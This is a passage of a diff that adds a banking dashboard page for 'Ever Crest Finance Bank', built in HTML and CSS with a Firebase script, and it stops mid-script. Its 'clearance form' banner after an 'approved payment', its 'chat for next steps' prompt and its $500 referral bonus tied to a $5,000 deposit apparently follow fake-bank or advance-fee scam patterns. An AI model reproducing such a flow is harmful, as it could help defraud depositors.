@@ -1,0 +1,1673 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>Dashboard | Ever Crest Finance Bank</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            box-sizing: border-box;
+            padding-top: env(safe-area-inset-top, 0px);
+            padding-bottom: env(safe-area-inset-bottom, 0px);
+            --bg: #f5f7fb;
+            --surface: #fff;
+            --ink: #0b2340;
+            --soft: #5b6f86;
+            --line: #d5dee8;
+            --gold: #ffc93c;
+            --ok: #12a06b;
+            --bad: #d64535;
+            --shadow: 0 20px 50px -30px rgba(11, 35, 64, .35)
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: inherit
+        }
+
+        html {
+            height: 100%;
+            -webkit-text-size-adjust: 100%;
+            scroll-padding-top: env(safe-area-inset-top, 0px)
+        }
+
+        body {
+            margin: 0;
+            min-height: 100%;
+            background: var(--bg);
+            color: var(--ink);
+            font: 15px/1.5 "Plus Jakarta Sans", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif
+        }
+
+        [hidden] {
+            display: none !important
+        }
+
+        .top {
+            position: sticky;
+            top: env(safe-area-inset-top, 0px);
+            z-index: 20;
+            background: rgba(255, 255, 255, .94);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-bottom: 1px solid var(--line)
+        }
+
+        .top .in {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 10px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px
+        }
+
+        .brand {
+            font-weight: 800;
+            letter-spacing: -.01em
+        }
+
+        .brand i {
+            font-style: normal;
+            color: #e0a800
+        }
+
+        .who {
+            display: flex;
+            align-items: center;
+            gap: 10px
+        }
+
+        .av {
+            text-decoration: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: var(--ink);
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            overflow: hidden;
+            color: var(--gold);
+            display: grid;
+            place-items: center;
+            font-weight: 800;
+            font-size: .82rem
+        }
+
+        .av.has-img {
+            color: transparent
+        }
+
+        .av:hover {
+            filter: brightness(1.2)
+        }
+
+        main {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px 18px 44px
+        }
+
+        #loading {
+            text-align: center;
+            color: var(--soft);
+            padding: 80px 0
+        }
+
+        h1 {
+            font-size: clamp(1.4rem, 4.5vw, 2rem);
+            margin: 0 0 2px;
+            letter-spacing: -.02em;
+            font-weight: 800
+        }
+
+        .sub {
+            color: var(--soft);
+            margin: 0 0 16px;
+            font-size: .9rem
+        }
+
+        /* ===== CLEARANCE BANNER ===== */
+        .clearance-banner {
+            position: relative;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 16px 14px 20px;
+            margin-top: 20px;
+            margin-bottom: 16px;
+            border-radius: 14px;
+            background: linear-gradient(180deg, #fffdf6 0%, #ffffff 100%);
+            border: 1px solid #f1e3b0;
+            box-shadow: 0 8px 22px -16px rgba(11, 35, 64, .25);
+            color: var(--ink);
+            text-decoration: none;
+            overflow: hidden;
+            transition: transform .15s ease, box-shadow .2s ease, border-color .2s ease, background .2s ease
+        }
+
+        .clearance-banner::before {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 5px;
+            background: linear-gradient(180deg, #ffd766, var(--gold));
+            transition: background .2s ease
+        }
+
+        .clearance-banner:hover {
+            transform: translateY(-1px);
+            border-color: var(--gold);
+            box-shadow: 0 12px 26px -16px rgba(11, 35, 64, .35)
+        }
+
+        .clearance-banner:active {
+            transform: translateY(0)
+        }
+
+        .clearance-banner:focus-visible {
+            outline: 3px solid var(--gold);
+            outline-offset: 2px
+        }
+
+        .cb-icon {
+            flex: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            background: #fff3c4;
+            color: #9a6b00;
+            display: grid;
+            place-items: center;
+            transition: background .2s ease, color .2s ease
+        }
+
+        .cb-icon svg {
+            width: 21px;
+            height: 21px
+        }
+
+        .cb-icon .cb-icon-progress {
+            display: none
+        }
+
+        .cb-body {
+            flex: 1;
+            min-width: 0
+        }
+
+        .cb-title {
+            font-weight: 700;
+            font-size: .92rem;
+            line-height: 1.3;
+            color: var(--ink);
+            margin-bottom: 2px
+        }
+
+        .cb-text {
+            font-size: .76rem;
+            line-height: 1.4;
+            color: var(--soft)
+        }
+
+        .cb-cta {
+            flex: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 9px 16px;
+            border-radius: 999px;
+            background: var(--ink);
+            color: #fff;
+            font-weight: 700;
+            font-size: .78rem;
+            white-space: nowrap;
+            transition: background .2s ease
+        }
+
+        .clearance-banner:hover .cb-cta {
+            background: #123a68
+        }
+
+        .cb-arrow {
+            display: inline-block;
+            color: var(--gold);
+            transition: transform .2s ease
+        }
+
+        .clearance-banner:hover .cb-arrow {
+            transform: translateX(3px)
+        }
+
+        .clearance-banner.progress {
+            cursor: default;
+            background: linear-gradient(180deg, #f6f9fd 0%, #ffffff 100%);
+            border-color: var(--line)
+        }
+
+        .clearance-banner.progress::before {
+            background: linear-gradient(180deg, #9db6d6, #5b7fa6)
+        }
+
+        .clearance-banner.progress .cb-icon {
+            background: #e8eef7;
+            color: #3d5a80
+        }
+
+        .clearance-banner.progress .cb-icon .cb-icon-action {
+            display: none
+        }
+
+        .clearance-banner.progress .cb-icon .cb-icon-progress {
+            display: block;
+            animation: cbSpin 1.8s linear infinite
+        }
+
+        .clearance-banner.progress .cb-cta {
+            display: none
+        }
+
+        .clearance-banner.progress:hover {
+            transform: none;
+            border-color: var(--line);
+            box-shadow: 0 8px 22px -16px rgba(11, 35, 64, .25)
+        }
+
+        .clearance-banner.chat {
+            background: linear-gradient(180deg, #f2fbf7 0%, #ffffff 100%);
+            border-color: #bfe8d6
+        }
+
+        .clearance-banner.chat::before {
+            background: linear-gradient(180deg, #5fd3a4, var(--ok))
+        }
+
+        .clearance-banner.chat .cb-icon {
+            background: #dcf5ea;
+            color: #0b6b47
+        }
+
+        .clearance-banner.chat:hover {
+            border-color: var(--ok)
+        }
+
+        @keyframes cbSpin {
+            to {
+                transform: rotate(360deg)
+            }
+        }
+
+        @media (max-width: 640px) {
+            .clearance-banner {
+                flex-wrap: wrap;
+                padding: 14px 14px 14px 18px;
+                gap: 12px
+            }
+
+            .cb-body {
+                flex: 1 1 calc(100% - 60px)
+            }
+
+            .cb-cta {
+                width: 100%;
+                justify-content: center;
+                padding: 10px 14px
+            }
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 16px
+        }
+
+        .bal {
+            position: relative;
+            overflow: hidden;
+            color: #fff;
+            border-radius: 20px;
+            padding: 22px;
+            background: linear-gradient(135deg, #123a68, #0b2340 55%, #071a30);
+            box-shadow: 0 30px 60px -30px rgba(7, 26, 48, .7)
+        }
+
+        .bal::before {
+            content: "";
+            position: absolute;
+            right: -60px;
+            bottom: -80px;
+            width: 240px;
+            height: 240px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255, 201, 60, .45), transparent 68%)
+        }
+
+        .bal>* {
+            position: relative
+        }
+
+        .lbl {
+            opacity: .72;
+            font-size: .8rem
+        }
+
+        .amt {
+            font-size: clamp(1.9rem, 7vw, 2.7rem);
+            font-weight: 800;
+            letter-spacing: -.02em;
+            margin: 2px 0
+        }
+
+        .meta {
+            opacity: .72;
+            font-size: .8rem
+        }
+
+        #acctMeta {
+            word-break: break-all
+        }
+
+        #acctMeta.review {
+            color: var(--gold);
+            opacity: 1;
+            font-weight: 700
+        }
+
+        /* ===== WALLET COPY ===== */
+        .wallet-copy {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: none;
+            border: 0;
+            padding: 0;
+            margin: 0;
+            color: inherit;
+            font: inherit;
+            text-align: left;
+            cursor: pointer;
+            word-break: break-all
+        }
+
+        .wallet-copy svg {
+            flex: none;
+            width: 15px;
+            height: 15px
+        }
+
+        .wallet-copy:hover span {
+            text-decoration: underline
+        }
+
+        .wallet-copy:focus-visible {
+            outline: 3px solid var(--gold);
+            outline-offset: 3px;
+            border-radius: 4px
+        }
+
+        .actions {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-top: 18px
+        }
+
+        .act {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255, 255, 255, .1);
+            border: 1px solid rgba(255, 255, 255, .16);
+            color: #fff;
+            border-radius: 14px;
+            padding: 10px 4px;
+            font: inherit;
+            font-size: .78rem;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none
+        }
+
+        .act:hover {
+            background: rgba(255, 255, 255, .18)
+        }
+
+        .act:focus-visible {
+            outline: 3px solid var(--gold);
+            outline-offset: 2px
+        }
+
+        .act svg {
+            width: 20px;
+            height: 20px
+        }
+
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--line);
+            border-radius: 16px;
+            padding: 16px;
+            box-shadow: var(--shadow)
+        }
+
+        .sec {
+            margin-top: 26px
+        }
+
+        .sec>h2 {
+            font-size: 1.15rem;
+            font-weight: 800;
+            margin: 0 0 12px;
+            letter-spacing: -.01em
+        }
+
+        .empty {
+            text-align: center;
+            color: var(--soft);
+            padding: 26px 8px
+        }
+
+        .snack {
+            position: fixed;
+            top: calc(env(safe-area-inset-top, 0px) + 12px);
+            left: 50%;
+            z-index: 99;
+            width: min(92vw, 460px);
+            padding: 13px 16px;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 600;
+            font-size: .9rem;
+            background: var(--ink);
+            box-shadow: 0 14px 34px -12px rgba(11, 35, 64, .6);
+            transform: translate(-50%, -160%);
+            opacity: 0;
+            transition: transform .35s cubic-bezier(.2, .8, .2, 1), opacity .3s;
+            pointer-events: none
+        }
+
+        .snack.show {
+            transform: translate(-50%, 0);
+            opacity: 1
+        }
+
+        .snack.success {
+            background: var(--ok)
+        }
+
+        .snack.error {
+            background: var(--bad)
+        }
+
+        .sr {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            clip: rect(0 0 0 0)
+        }
+
+        @media (max-width: 859px) {
+            main {
+                padding: 14px 14px 36px
+            }
+
+            .top .in {
+                padding: 8px 14px
+            }
+        }
+
+        @media (max-width: 480px) {
+            .actions {
+                gap: 6px
+            }
+
+            .bal {
+                padding: 18px
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                transition: none !important;
+                animation: none !important
+            }
+        }
+
+        .inv-cards {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px
+        }
+
+        .inv-card {
+            display: flex;
+            gap: 14px;
+            align-items: flex-start
+        }
+
+        .inv-ic {
+            flex: none;
+            width: 42px;
+            height: 42px;
+            border-radius: 12px;
+            display: grid;
+            place-items: center;
+            background: #fff3c4;
+            color: var(--ink)
+        }
+
+        .inv-ic svg {
+            width: 22px;
+            height: 22px
+        }
+
+        .inv-card h3 {
+            margin: 0 0 2px;
+            font-size: .98rem;
+            font-weight: 800
+        }
+
+        .inv-card p {
+            margin: 0;
+            color: var(--soft);
+            font-size: .86rem
+        }
+
+        .inv-note {
+            margin: 12px 2px 0;
+            color: var(--soft);
+            font-size: .76rem
+        }
+
+        @media (min-width: 640px) {
+            .inv-cards {
+                grid-template-columns: repeat(2, 1fr)
+            }
+        }
+
+        @media (min-width: 1000px) {
+            .inv-cards {
+                grid-template-columns: repeat(4, 1fr)
+            }
+        }
+
+        .acts {
+            list-style: none;
+            margin: 0;
+            padding: 0
+        }
+
+        .act-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 2px;
+            border-bottom: 1px solid var(--line)
+        }
+
+        .act-row:last-child {
+            border-bottom: 0
+        }
+
+        .act-ic {
+            flex: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: grid;
+            place-items: center;
+            background: #fde8e5;
+            color: var(--bad)
+        }
+
+        .act-row.in .act-ic {
+            background: #e3f6ee;
+            color: var(--ok)
+        }
+
+        .act-ic svg {
+            width: 18px;
+            height: 18px
+        }
+
+        .act-main {
+            flex: 1;
+            min-width: 0
+        }
+
+        .act-t {
+            font-weight: 700;
+            font-size: .92rem;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap
+        }
+
+        .act-d {
+            color: var(--soft);
+            font-size: .76rem
+        }
+
+        .act-a {
+            flex: none;
+            font-weight: 800;
+            font-size: .95rem;
+            color: var(--ink)
+        }
+
+        .act-row.in .act-a {
+            color: var(--ok)
+        }
+
+        .notif {
+            position: relative
+        }
+
+        .bell {
+            position: relative;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            border: 1.5px solid var(--line);
+            background: #fff;
+            color: var(--ink);
+            display: grid;
+            place-items: center;
+            cursor: pointer;
+            padding: 0
+        }
+
+        .bell:hover,
+        .bell[aria-expanded="true"] {
+            border-color: var(--ink)
+        }
+
+        .bell svg {
+            width: 20px;
+            height: 20px
+        }
+
+        .ncount {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            min-width: 19px;
+            height: 19px;
+            padding: 0 5px;
+            border-radius: 999px;
+            background: var(--bad);
+            color: #fff;
+            font-size: .68rem;
+            font-weight: 800;
+            display: grid;
+            place-items: center;
+            border: 2px solid #fff;
+            line-height: 1
+        }
+
+        .npanel {
+            position: absolute;
+            right: 0;
+            top: calc(100% + 10px);
+            width: min(92vw, 350px);
+            background: #fff;
+            border: 1px solid var(--line);
+            border-radius: 14px;
+            box-shadow: 0 24px 50px -20px rgba(11, 35, 64, .45);
+            overflow: hidden;
+            z-index: 30
+        }
+
+        .nhead {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 14px;
+            border-bottom: 1px solid var(--line)
+        }
+
+        .nhead b {
+            font-size: .95rem
+        }
+
+        .linkbtn {
+            background: none;
+            border: 0;
+            padding: 0;
+            font: inherit;
+            font-size: .8rem;
+            font-weight: 700;
+            color: var(--ink);
+            text-decoration: underline;
+            cursor: pointer
+        }
+
+        .nlist {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            max-height: 340px;
+            overflow-y: auto
+        }
+
+        .nitem {
+            display: flex;
+            gap: 10px;
+            padding: 12px 14px;
+            border-bottom: 1px solid var(--line)
+        }
+
+        .nitem:last-child {
+            border-bottom: 0
+        }
+
+        .nitem.unread {
+            background: #fffbea
+        }
+
+        .ndot {
+            flex: none;
+            width: 8px;
+            height: 8px;
+            margin-top: 7px;
+            border-radius: 50%;
+            background: transparent
+        }
+
+        .nitem.unread .ndot {
+            background: var(--bad)
+        }
+
+        .nt {
+            font-weight: 700;
+            font-size: .88rem
+        }
+
+        .nm {
+            color: var(--soft);
+            font-size: .82rem;
+            margin-top: 1px;
+            word-break: break-word
+        }
+
+        .nw {
+            color: var(--soft);
+            font-size: .72rem;
+            margin-top: 3px
+        }
+
+        .nempty {
+            text-align: center;
+            color: var(--soft);
+            font-size: .88rem;
+            padding: 26px 14px
+        }
+
+        .helpbtn {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            border: 1.5px solid var(--line);
+            background: #fff;
+            color: var(--ink);
+            display: grid;
+            place-items: center;
+            text-decoration: none
+        }
+
+        .helpbtn:hover {
+            border-color: var(--ink)
+        }
+
+        .helpbtn:focus-visible {
+            outline: 3px solid var(--ink);
+            outline-offset: 2px
+        }
+
+        .helpbtn svg {
+            width: 20px;
+            height: 20px
+        }
+
+        /* ===== REFERRAL ===== */
+        .ref-head {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px
+        }
+
+        .ref-ic {
+            flex: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            background: #fff3c4;
+            color: #9a6b00;
+            display: grid;
+            place-items: center
+        }
+
+        .ref-ic svg {
+            width: 21px;
+            height: 21px
+        }
+
+        .ref-title {
+            font-size: 1rem;
+            font-weight: 800;
+            margin: 0;
+            letter-spacing: -.01em
+        }
+
+        .ref-desc {
+            color: var(--soft);
+            font-size: .87rem;
+            margin: 0 0 14px
+        }
+
+        .ref-desc b {
+            color: var(--ink);
+            font-weight: 800
+        }
+
+        .ref-linkbox {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #f6f8fc;
+            border: 1px solid var(--line);
+            border-radius: 12px;
+            padding: 8px 8px 8px 14px;
+            margin-bottom: 8px
+        }
+
+        .ref-linkbox input {
+            flex: 1;
+            min-width: 0;
+            background: transparent;
+            border: 0;
+            color: var(--ink);
+            font: inherit;
+            font-size: .82rem;
+            font-weight: 600;
+            outline: none;
+            text-overflow: ellipsis
+        }
+
+        .ref-copy {
+            flex: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 8px 14px;
+            border-radius: 9px;
+            border: 0;
+            background: var(--ink);
+            color: #fff;
+            font: inherit;
+            font-size: .78rem;
+            font-weight: 800;
+            cursor: pointer;
+            transition: background .15s ease
+        }
+
+        .ref-copy:hover {
+            background: #123a68
+        }
+
+        .ref-copy:focus-visible {
+            outline: 3px solid var(--gold);
+            outline-offset: 2px
+        }
+
+        .ref-copy svg {
+            width: 15px;
+            height: 15px
+        }
+
+        .ref-hint {
+            font-size: .74rem;
+            color: var(--soft);
+            margin: 0
+        }
+
+        @media (max-width: 420px) {
+            .ref-linkbox {
+                flex-wrap: wrap;
+                padding: 10px
+            }
+
+            .ref-copy {
+                width: 100%;
+                justify-content: center
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="snack" id="snack" role="status" aria-live="polite"></div>
+
+    <svg class="sr" aria-hidden="true">
+        <defs>
+            <symbol id="i-transfer" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M7 7h11l-3-3M17 17H6l3 3" />
+            </symbol>
+            <symbol id="i-plus" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 5v14M5 12h14" />
+            </symbol>
+            <symbol id="i-minus" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14" />
+            </symbol>
+            <symbol id="i-loan" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="6" width="18" height="12" rx="2" />
+                <circle cx="12" cy="12" r="2.5" />
+                <path d="M6.5 9.5v.01M17.5 14.5v.01" />
+            </symbol>
+            <symbol id="i-up" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M7 17L17 7M8 7h9v9" />
+            </symbol>
+            <symbol id="i-down" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M17 7L7 17M16 17H7V8" />
+            </symbol>
+            <symbol id="i-briefcase" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="7" width="18" height="13" rx="2" />
+                <path d="M9 7V5a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2M3 13h18" />
+            </symbol>
+            <symbol id="i-bank" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M3 10l9-6 9 6M5 10v8M9 10v8M15 10v8M19 10v8M3 20h18" />
+            </symbol>
+            <symbol id="i-coin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="9" />
+                <path
+                    d="M14.5 9.5c-.5-1-1.5-1.5-2.5-1.5-1.4 0-2.5.8-2.5 2s1.1 1.7 2.5 2 2.5.8 2.5 2-1.1 2-2.5 2c-1 0-2-.5-2.5-1.5M12 6v2M12 16v2" />
+            </symbol>
+            <symbol id="i-shield" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6z" />
+                <path d="M9 12l2 2 4-4" />
+            </symbol>
+            <symbol id="i-gift" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="8" width="18" height="4" rx="1" />
+                <path d="M12 8v13M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-7" />
+                <path d="M12 8S10.5 4 8 4a2 2 0 0 0 0 4M12 8s1.5-4 4-4a2 2 0 0 1 0 4" />
+            </symbol>
+            <symbol id="i-copy" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <rect x="9" y="9" width="12" height="12" rx="2" />
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+            </symbol>
+            <symbol id="i-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12.5l4.5 4.5L19 7.5" />
+            </symbol>
+        </defs>
+    </svg>
+
+    <header class="top">
+        <div class="in">
+            <div class="brand"><i>Ever</i> Crest Finance Bank</div>
+            <div class="who">
+                <a class="helpbtn" href="help.html" aria-label="Help" title="Help">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round" aria-hidden="true">
+                        <circle cx="12" cy="12" r="9" />
+                        <path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 2.5-3 4M12 17.5v.01" />
+                    </svg>
+                </a>
+                <a class="av" id="avatar" href="profile.html" aria-label="Your profile" title="Your profile">EC</a>
+                <div class="notif">
+                    <button class="bell" type="button" id="bell" aria-label="Notifications" aria-haspopup="true"
+                        aria-expanded="false" aria-controls="nPanel">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                            <path d="M6 8a6 6 0 1 1 12 0c0 7 3 9 3 9H3s3-2 3-9M10.3 21a1.9 1.9 0 0 0 3.4 0" />
+                        </svg>
+                        <span class="ncount" id="nCount" hidden>0</span>
+                    </button>
+                    <div class="npanel" id="nPanel" hidden>
+                        <div class="nhead"><b>Notifications</b><button class="linkbtn" type="button" id="markAll">Mark
+                                all as read</button></div>
+                        <ul class="nlist" id="nList"></ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <p id="loading">Loading your dashboard…</p>
+
+        <div id="app" hidden>
+            <h1 id="greet">Welcome</h1>
+            <p class="sub">Here is a summary of your online banking.</p>
+
+            <section class="grid">
+                <div class="bal">
+                    <div class="lbl">Available balance</div>
+                    <div class="amt" id="balance">0.00</div>
+                    <div class="meta" id="acctMeta">Checking wallet…</div>
+                    <div class="actions">
+                        <a class="act" href="transfer.html"><svg>
+                                <use href="#i-transfer" />
+                            </svg>Transfer</a>
+                        <a class="act" href="deposit.html"><svg>
+                                <use href="#i-plus" />
+                            </svg>Deposit</a>
+                        <a class="act" href="withdraw.html"><svg>
+                                <use href="#i-minus" />
+                            </svg>Withdraw</a>
+                        <a class="act" href="check-withdrawal-status.html"><svg>
+                                <use href="#i-loan" />
+                            </svg>Request</a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ============ CLEARANCE BANNER ============ -->
+            <a class="clearance-banner" id="clearanceBanner" href="clearanceform.html" hidden>
+                <span class="cb-icon">
+                    <svg class="cb-icon-action" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                        stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                        <path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z" />
+                        <path d="M14 3v5h5M9 14l2 2 4-4" />
+                    </svg>
+                    <svg class="cb-icon-progress" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                        stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                        <circle cx="12" cy="12" r="9" />
+                        <path d="M12 7v5l3 3" />
+                    </svg>
+                </span>
+                <div class="cb-body">
+                    <div class="cb-title" id="cbTitle">Action Required</div>
+                    <div class="cb-text" id="cbText">Payment approved and added to your wallet. Please complete the
+                        clearance form.</div>
+                </div>
+                <span class="cb-cta" id="cbCta"><span id="cbCtaLabel">Complete Clearance</span><span
+                        class="cb-arrow">→</span></span>
+            </a>
+
+            <!-- ============ SECTION B BANNER (Proceed to chat with admin) ============ -->
+            <a class="clearance-banner chat" id="sectionBBanner" href="help.html" hidden>
+                <span class="cb-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round" aria-hidden="true">
+                        <path d="M21 15a2 2 0 0 1-2 2H8l-5 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
+                    </svg>
+                </span>
+                <div class="cb-body">
+                    <div class="cb-title">Proceed to Final Step</div>
+                    <div class="cb-text">Your clearance is complete. Chat with our support team to receive your next
+                        steps.</div>
+                </div>
+                <span class="cb-cta"><span>Chat Now</span></span>
+            </a>
+
+            <section class="sec">
+                <h2>Recent activity</h2>
+                <div class="card" id="actCard">
+                    <div class="empty" id="actEmpty">No transactions yet. Fund your account to get started.</div>
+                    <ul class="acts" id="actList" hidden></ul>
+                </div>
+            </section>
+
+            <section class="sec">
+                <h2>Investment</h2>
+                <div class="inv-cards">
+                    <div class="card inv-card">
+                        <span class="inv-ic"><svg aria-hidden="true">
+                                <use href="#i-briefcase" />
+                            </svg></span>
+                        <div>
+                            <h3>401K investments</h3>
+                            <p>Save for retirement straight from your paycheck. Contributions are invested and can grow
+                                over time, often with tax advantages and employer matching.</p>
+                        </div>
+                    </div>
+                    <div class="card inv-card">
+                        <span class="inv-ic"><svg aria-hidden="true">
+                                <use href="#i-bank" />
+                            </svg></span>
+                        <div>
+                            <h3>Pension</h3>
+                            <p>A long-term retirement plan that builds up over your working years and pays you a regular
+                                income once you retire.</p>
+                        </div>
+                    </div>
+                    <div class="card inv-card">
+                        <span class="inv-ic"><svg aria-hidden="true">
+                                <use href="#i-coin" />
+                            </svg></span>
+                        <div>
+                            <h3>IRA</h3>
+                            <p>An Individual Retirement Account you open yourself. Your money can grow tax-advantaged
+                                while you save toward your retirement goals.</p>
+                        </div>
+                    </div>
+                    <div class="card inv-card">
+                        <span class="inv-ic"><svg aria-hidden="true">
+                                <use href="#i-shield" />
+                            </svg></span>
+                        <div>
+                            <h3>Life Insurance</h3>
+                            <p>Protects the people you love by paying a benefit to your beneficiaries, giving your
+                                family financial security if the unexpected happens.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ============ REFERRAL ============ -->
+            <section class="sec" id="referralSection" hidden>
+                <h2>Refer &amp; Earn</h2>
+                <div class="card">
+                    <div class="ref-head">
+                        <span class="ref-ic"><svg aria-hidden="true">
+                                <use href="#i-gift" />
+                            </svg></span>
+                        <h3 class="ref-title">Refer 1 user &amp; get $500 free</h3>
+                    </div>
+                    <p class="ref-desc">
+                        Share your referral link below. When someone signs up using your link and deposits at least
+                        <b>$5,000</b>, you’ll receive a <b>$500</b> bonus, credited directly to your wallet.
+                    </p>
+                    <div class="ref-linkbox">
+                        <input id="refLink" type="text" readonly aria-label="Your referral link" value="">
+                        <button class="ref-copy" type="button" id="refCopy"><svg aria-hidden="true">
+                                <use href="#i-copy" />
+                            </svg> Copy</button>
+                    </div>
+                    <p class="ref-hint">Your referral link 🔗 - share it with friends and family to start earning.</p>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+        import { getAuth } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-auth.js";
+        import { getDatabase, ref, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
+        import { openDb, q, run } from "./localdb.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBH0n84QTvGBWaSlJdO6AoUU6IRuJETHLA",
+            authDomain: "ever-crest-finance-bank.firebaseapp.com",
+            projectId: "ever-crest-finance-bank",
+            storageBucket: "ever-crest-finance-bank.firebasestorage.app",
+            messagingSenderId: "469287844559",
+            appId: "1:469287844559:web:4f219675a1055533be95ba"
+        };
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getDatabase(app);
+
+        const ROUTES = { 1: 'personal.html', 2: 'address.html', 3: 'finalstep.html', 4: 'dashboard.html' };
+        const $ = i => document.getElementById(i);
+        let sqlOk = false;
+
+        const LOCALE = { NGN: 'en-NG', USD: 'en-US', GBP: 'en-GB', EUR: 'en-IE', GHS: 'en-GH', KES: 'en-KE', ZAR: 'en-ZA' };
+        const money = (n, c) => {
+            try { return new Intl.NumberFormat(LOCALE[c] || 'en', { style: 'currency', currency: c || 'USD' }).format(Number(n) || 0); }
+            catch (_) { return (c || '') + ' ' + (Number(n) || 0).toFixed(2); }
+        };
+
+        // Best display name: fullName first, then first/other/last name
